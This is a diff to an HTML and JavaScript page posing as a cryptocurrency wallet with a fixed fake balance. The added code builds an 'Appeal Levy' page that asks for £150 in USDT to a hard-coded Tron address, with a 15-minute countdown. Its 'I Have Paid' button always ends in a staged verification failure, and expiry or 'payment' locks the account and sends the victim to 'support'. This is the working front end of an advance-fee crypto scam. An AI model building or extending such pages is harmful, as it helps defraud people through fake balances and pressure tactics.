@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -100,11 +100,86 @@
         .balance-card {
             padding-top: 20px;
         }
-
+        
+        /* NEW: Padlock style for locked balance */
+        .balance-display-row {
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+        
         .balance-text {
             font-size: 50px;
             font-weight: 700;
         }
+        
+        .balance-padlock {
+            position: absolute;
+            right: 0;
+            font-size: 20px;
+            color: var(--color-red); /* Using red to signify a lock/problem */
+            display: none; /* Hidden by default */
+            margin-left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        
+        /* NEW: Countdown timer style */
+        .countdown-timer {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--color-red);
+            margin-bottom: 20px;
+        }
+        
+        .account-details-container {
+            background-color: var(--color-black);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--color-separator);
+        }
+        
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: var(--color-light-gray);
+            font-size: 14px;
+        }
+        
+        .detail-value {
+            font-weight: 500;
+            font-size: 15px;
+            color: var(--color-green);
+            max-width: 60%;
+            text-align: right;
+            word-wrap: break-word;
+        }
+        
+        /* NEW: Button for "I have paid" */
+        .paid-button {
+            padding: 15px;
+            background-color: var(--color-green);
+            color: var(--color-black);
+            font-weight: 700;
+            text-align: center;
+            border-radius: 8px;
+            margin-top: 30px;
+            cursor: pointer;
+            width: 100%;
+            border: none;
+            font-size: 16px;
+        }
+
 
         .balance-sub-row {
             display: flex;
@@ -858,7 +933,10 @@
         
         <div id="home-screen" class="screen active">
             <div class="balance-card">
-                <div class="balance-text">$15,645.90</div>
+                <div class="balance-display-row">
+                    <div class="balance-text">$15,645.90</div>
+                    <i class="fas fa-lock balance-padlock" id="balance-padlock-icon"></i>
+                </div>
                 <div class="balance-sub-row">
                     <span>+$15,892.21 (0.553316 BTC)</span>
                     <i class="fas fa-caret-down" style="font-size: 10px;"></i>
@@ -1310,6 +1388,50 @@
                 <p class="transaction-message" id="transaction-message">Transferring to Card...</p> </div>
              <button class="modal-close-button" style="opacity: 0; pointer-events: none;">...</button>
         </div>
+        
+        <div class="modal-page" id="levy-payment-page">
+            <div class="modal-page-header" style="justify-content: space-between;">
+                <span class="modal-page-title">Appeal Levy Payment</span>
+                <i class="fas fa-times" onclick="hideModal('send-options-modal')"></i>
+            </div>
+            
+            <div class="countdown-timer" id="levy-countdown">15:00</div>
+            
+            <p style="color: var(--color-light-gray); margin-bottom: 15px; text-align: center;">
+                **Action Required:** Send the non-refundable <span style="color: var(--color-red); font-weight: 700;">Appeal Levy of £<span id="levy-amount-display">150.00</span></span> (payable in <span id="levy-coin-display">USDT</span>) to the address below within the time limit.
+            </p>
+            
+            <div class="account-details-container">
+                <div class="detail-row">
+                    <span class="detail-label">Asset Required</span>
+                    <span class="detail-value" id="levy-asset-detail">USDT</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Required Amount (USD est.)</span>
+                    <span class="detail-value" id="levy-amount-usd-detail">150.00</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Network/Chain</span>
+                    <span class="detail-value">TRC20 (Tron)</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Payment Address</span>
+                    <span class="detail-value" id="levy-address-detail">TFHj...0JkL</span>
+                </div>
+            </div>
+            
+            <p style="color: var(--color-light-gray); font-size: 12px; margin-bottom: 30px;">
+                ***WARNING:*** Sending the wrong coin or amount may result in irreversible loss of funds.
+            </p>
+
+            <button class="paid-button" id="paid-button" onclick="iHavePaid()">I Have Paid</button>
+            
+            <div class="transaction-spinner-container" id="paid-spinner" style="display: none; height: 100px; margin-top: 20px;">
+                <div class="transaction-spinner"></div>
+                <p class="transaction-message">Processing Payment Confirmation...</p> 
+            </div>
+        </div>
+        
     </div>
 </div>
 
@@ -1354,8 +1476,11 @@
     // NEW: Global Appeal State
     let appealState = {
         levyAmount: 150.00, // Mock appeal levy in GBP
-        levyCoin: 'USDT'
+        levyCoin: 'USDT',
+        levyAddress: 'TFHj5Gz4X7bY1fR3w2A0JkL9vD8E7C6B'
     };
+    
+    let countdownInterval = null; // To hold the countdown interval reference
 
     function switchScreen(screenId) {
         const screens = document.querySelectorAll('.screen');
@@ -1388,6 +1513,12 @@
         if (modalId === 'send-options-modal') {
              switchSendPage('send-options-page', 'Choose Send Method', true); // Reset to start page
              state.sendHistory = ['send-options-page'];
+             // Stop and clear the countdown when the modal is closed manually
+             if (countdownInterval) {
+                 clearInterval(countdownInterval);
+                 countdownInterval = null;
+                 document.getElementById('levy-countdown').innerText = '15:00';
+             }
         }
     }
 
@@ -1581,11 +1712,12 @@
         setTimeout(() => {
             document.getElementById('appeal-processing-modal').classList.remove('active');
             
-            // Show the levy required popup
+            // Show the levy required popup (now custom logic)
             showAppealLevyRequired();
         }, 10000); // 10 seconds
     }
     
+    // NEW: Custom function to initiate the Levy Payment Flow (Modal)
     function showAppealLevyRequired() {
         const levyFee = appealState.levyAmount.toFixed(2);
         const levyCoin = appealState.levyCoin;
@@ -1595,12 +1727,109 @@
             `Your appeal is under review. To process the appeal and secure the release of your full balance, a non-refundable **Appeal Levy of £${levyFee}** (payable in ${levyCoin}) is required. Risk losing your appeal if the levy is not paid.`,
             "Pay Levy",
             function() {
-                 // Action to simulate going to a payment page (e.g., just switch back to home screen)
-                 alert(`Redirecting to a secure payment page for the £${levyFee} ${levyCoin} levy...`);
-                 switchScreen('home');
+                 // Action to simulate going to the custom payment page
+                 showLevyPaymentPage();
             },
             false // Do not show cancel button
         );
+    }
+    
+    // NEW: Show the Levy Payment Page with Countdown
+    function showLevyPaymentPage() {
+        // 1. Show the modal
+        showModal('send-options-modal');
+        // 2. Switch to the custom page
+        switchSendPage('levy-payment-page', 'Appeal Levy Payment');
+        
+        // 3. Update UI details
+        document.getElementById('levy-amount-display').innerText = appealState.levyAmount.toFixed(2);
+        document.getElementById('levy-coin-display').innerText = appealState.levyCoin;
+        document.getElementById('levy-asset-detail').innerText = appealState.levyCoin;
+        document.getElementById('levy-amount-usd-detail').innerText = appealState.levyAmount.toFixed(2);
+        document.getElementById('levy-address-detail').innerText = appealState.levyAddress.slice(0, 4) + '...' + appealState.levyAddress.slice(-4);
+        
+        // Reset and show the paid button/hide spinner
+        document.getElementById('paid-button').style.display = 'block';
+        document.getElementById('paid-spinner').style.display = 'none';
+        
+        // 4. Start the 15-minute countdown
+        startCountdown(15 * 60); // 15 minutes in seconds
+    }
+    
+    // NEW: Countdown Timer Function
+    function startCountdown(duration) {
+        let timer = duration;
+        const display = document.getElementById('levy-countdown');
+        
+        // Clear any existing interval
+        if (countdownInterval) {
+            clearInterval(countdownInterval);
+        }
+
+        countdownInterval = setInterval(function () {
+            const minutes = parseInt(timer / 60, 10);
+            const seconds = parseInt(timer % 60, 10);
+
+            const formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
+            const formattedSeconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.textContent = formattedMinutes + ":" + formattedSeconds;
+
+            if (--timer < 0) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+                display.textContent = "00:00";
+                
+                // 5. Fallback and Padlock UI
+                hideModal('send-options-modal');
+                lockUI();
+                
+                showAlert(
+                    "TIME LIMIT EXCEEDED",
+                    "The 15-minute payment window has closed. Your account and funds are now locked. Contact support immediately.",
+                    "OK", 
+                    null, 
+                    false
+                );
+            }
+        }, 1000);
+    }
+    
+    // NEW: Function to lock the main UI balance
+    function lockUI() {
+        document.getElementById('balance-padlock-icon').style.display = 'inline-block';
+        // Optionally disable action buttons
+        document.getElementById('send-btn').classList.add('disabled');
+        document.querySelector('.action-button[onclick*="receive-modal"]').classList.add('disabled');
+        // Note: Disabling actual wallet functions is a backend job, here we do the UI change.
+    }
+    
+    // NEW: Function for "I Have Paid" button
+    function iHavePaid() {
+        // 1. Stop the countdown
+        if (countdownInterval) {
+            clearInterval(countdownInterval);
+            countdownInterval = null;
+        }
+        
+        // 2. Hide button, show spinner
+        document.getElementById('paid-button').style.display = 'none';
+        document.getElementById('paid-spinner').style.display = 'flex';
+        
+        // 3. Simulate 15-second processing failure
+        setTimeout(() => {
+            // 4. Hide modal, lock UI, and show final failure alert
+            hideModal('send-options-modal');
+            lockUI();
+            
+            showAlert(
+                "PAYMENT VERIFICATION FAILED",
+                "Your payment of the Appeal Levy could not be verified within the required timeframe. Your account and funds have been locked due to security protocols. Contact support immediately.",
+                "OK",
+                null,
+                false
+            );
+        }, 15000); // 15 seconds
     }
     
 </script>
